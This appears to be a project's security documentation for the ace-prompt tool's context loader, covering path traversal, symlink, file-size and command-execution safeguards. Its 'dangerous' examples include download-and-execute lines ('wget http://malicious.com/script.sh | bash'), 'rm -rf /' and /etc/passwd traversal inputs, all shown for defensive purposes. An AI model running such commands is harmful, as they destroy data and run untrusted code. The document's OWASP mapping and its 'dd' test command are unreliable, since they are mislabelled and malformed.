---
doc-type: user
title: Security Documentation
purpose: Documentation for ace-prompt-prep/docs/security.md
ace-docs:
  last-updated: 2026-01-20
  last-checked: 2026-03-21
---

# Security Documentation

This document covers security considerations, implemented protections, and recommended practices for ace-prompt context loading.

## Overview

ace-prompt loads context from external files and executes system commands to provide rich context for AI interactions. This functionality introduces security considerations that are addressed through multiple layers of validation and protection.

## Security Controls

### 1. Path Traversal Protection

**Implemented in**: `/lib/ace/prompt/molecules/context_loader.rb`

**Protection Level**: Comprehensive

#### Covered Attack Vectors:
- **Basic traversal**: `../`, `..\\`
- **URL-encoded traversal**: `%2e%2e`, `..%2f`, `%2e%2e%2f`
- **Shell injection**: `;`, `&`, `|`, `` ``
- **Absolute path validation**: Rejects absolute paths outside project root
- **Symlink attacks**: Real path resolution with project boundary validation

#### Implementation Details:
```ruby
def self.valid_prompt_path?(prompt_path)
  # Multiple pattern checks for traversal attempts
  return false if prompt_str.include?('../')
  return false if prompt_str.include?('%2e%2e')
  # ... comprehensive validation
end
```

### 2. Symlink Security

**Implemented in**: `/lib/ace/prompt/molecules/context_loader.rb`

**Protection**: Real path resolution with project boundary validation

```ruby
# Resolve symlinks and validate project boundaries
real_path = File.realpath(prompt_path) rescue prompt_path
project_root = Ace::Support::Fs::Molecules::ProjectRootFinder.find_or_current

unless real_path.start_with?(project_root)
  warn "Error: File path resolves outside project: #{real_path}"
  return ""
end
```

**Risk Mitigation**: Prevents access to files outside the project directory through symlink manipulation.

### 3. File Size Limits

**Implemented in**: `/lib/ace/prompt/molecules/context_loader.rb`

**Default Limit**: 10MB (configurable)

**Configuration**:
```yaml
security:
  max_file_size_mb: 10  # Configurable limit
```

**Protection**: Prevents denial of service through extremely large file processing.

### 4. Input Validation

**Validated Parameters**:
- File path formats and content
- Configuration options (format, embed_source)
- Data types and content validation

## Configuration Security

### Secure Defaults

```yaml
bundle:
  enabled: false  # Context loading disabled by default
security:
  max_file_size_mb: 10  # Conservative file size limit
debug:
  enabled: false  # Debug logging disabled in production
```

### Recommended Security Settings

#### Production Environment
```yaml
bundle:
  enabled: true
  sources:
    - file: "docs/architecture.md"    # Specific trusted files only
    - preset: "project-overview"     # Preset definitions only

security:
  max_file_size_mb: 5   # More conservative limit
  # Future: add allow_symlinks: false when implemented

debug:
  enabled: false
```

#### Development Environment
```yaml
bundle:
  enabled: true
  sources:
    - file: "**/*.md"               # All markdown files
    - command: "git log --oneline -5"  # Safe commands only

security:
  max_file_size_mb: 50  # Larger limit for development

debug:
  enabled: true
  context_loading: true  # Verbose logging
```

## Threat Model

### Attacker Capabilities
- **File System**: Write files with malicious content
- **Path Manipulation**: Attempt directory traversal
- **Resource Exhaustion**: Provide extremely large files
- **Code Injection**: Include malicious commands in frontmatter

### Attack Scenarios Addressed

#### 1. Path Traversal Attack
```
Attacker provides: "../../../etc/passwd"
Protection: Pattern matching + path validation
Result: Rejected before processing
```

#### 2. Symlink Attack
```
Attacker creates: symlink -> /etc/passwd
Protection: Real path resolution + project boundary check
Result: Rejected when resolving outside project
```

#### 3. Resource Exhaustion
```
Attacker provides: 500MB file with complex frontmatter
Protection: Configurable size limits
Result: Rejected before processing
```

## Security Best Practices

### 1. Configuration Management

✅ **Do**:
- Keep context loading disabled by default
- Use explicit file lists rather than wildcards
- Configure conservative file size limits
- Enable debug logging only in development
- Review context sources regularly

❌ **Don't**:
- Use wildcard patterns for sensitive directories
- Enable unlimited file sizes
- Allow external file access without validation
- Debug logging in production environments

### 2. File Access Patterns

✅ **Safe Patterns**:
```yaml
bundle:
  sources:
    - file: "docs/architecture.md"
    - file: "README.md"
    - preset: "coding-standards"
```

❌ **Risky Patterns**:
```yaml
bundle:
  sources:
    - file: "**/*"              # Too broad
    - file: "../../../etc/*"    # Directory traversal
    - command: "rm -rf /"    # Dangerous command
```

### 3. Command Execution

✅ **Safe Commands**:
```yaml
sources:
  - command: "git status --short"
  - command: "git log --oneline -5"
  - command: "find . -name '*.rb' -type f"
```

❌ **Dangerous Commands**:
```yaml
sources:
  - command: "rm -rf ."
  - command: "wget http://malicious.com/script.sh | bash"
  - command: "curl http://example.com | sh"
```

## Monitoring and Detection

### Debug Logging

Enable debug logging to monitor context loading behavior:

```yaml
debug:
  enabled: true
  context_loading: true
```

**Debug Output Examples**:
```
[DEBUG] Loading context from: docs/context.md
[DEBUG] File size: 1024 bytes (limit: 10MB)
[DEBUG] Context loaded successfully, content length: 5432 characters
```

### Error Monitoring

Key error messages that require attention:
- `"Error: ace-bundle gem not available"` - Dependency missing
- `"Error: File path resolves outside project"` - Security violation
- `"Error: Prompt file too large"` - Resource limit exceeded

### Security Event Response

1. **Immediate**: Log security violations with full details
2. **Investigation**: Review file paths and content
3. **Mitigation**: Adjust configuration or remove malicious files
4. **Monitoring**: Increase logging to detect patterns

## Testing Security Controls

### Security Test Coverage

**Test Files**: `test/molecules/context_loader_security_test.rb`

**Test Cases**:
- Path traversal with various encodings
- Symlink resolution attacks
- Absolute path validation
- Shell escape pattern injection
- File size limit enforcement
- Malformed input handling

### Manual Testing

```bash
# Test path traversal protection
echo "test content" | ace-prompt --context -p "../../../etc/passwd"

# Test symlink attack
ln -s /etc/passwd malicious.md
ace-prompt --context -p "malicious.md"

# Test size limit
dd if=/dev/zero of=50M large_file.md
ace-prompt --context -p "large_file.md"
```

## Compliance and Standards

### OWASP Guidelines

This implementation addresses OWASP Top 10 risks:

- **A01: Injection Prevention**: Command injection protection through validation
- **A03: Broken Authentication**: Not applicable (user-level tool)
- **A05: Security Misconfiguration**: Secure defaults and validation
- **A06: Vulnerable Components**: Dependency validation and fallbacks
- **A07: Identification & Authentication**: Not applicable (local tool)

### Security Headers

- **Path Validation**: Prevents file system access outside project
- **Input Sanitization**: Validates all input parameters
- **Error Handling**: Secure error messages without information leakage
- **Resource Limits**: Prevents denial of service attacks

## Reporting Security Issues

### Vulnerability Reporting

If you discover a security vulnerability in ace-prompt:

1. **Do not create public issues** for security problems
2. **Email**: Send report to security@project.org
3. **Details**: Include steps to reproduce, impact assessment, and system information
4. **Coordinated Disclosure**: Allow reasonable time for patch deployment

### Security Contacts

- **Security Team**: security@project.org
- **Primary Maintainer: [maintainer@project.org](mailto:maintainer@project.org)
- **Project Repository**: https://github.com/organization/ace-prompt

## Updates and Maintenance

### Version History

- **v0.3.0**: Initial security implementation
  - Path traversal protection
  - Symlink validation
  - Configurable file size limits
  - Enhanced input validation

### Regular Reviews

- Quarterly security reviews of input validation
- Annual penetration testing of context loading
- Continuous monitoring of new dependencies
- Regular updates of security documentation

## References

- [OWASP Command Injection Prevention](https://owasp.org/www-project-cheat-sheets/Command_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Path Traversal Prevention](https://owasp.org/www-project-cheat-sheets/Path_Traversal_Prevention_Cheat_Sheet.html)
- [Ruby Security Best Practices](https://github.com/rubysec/ruby-security-guide)
- [Ace-* Gem Security Guidelines](https://github.com/organization/ace-core/security)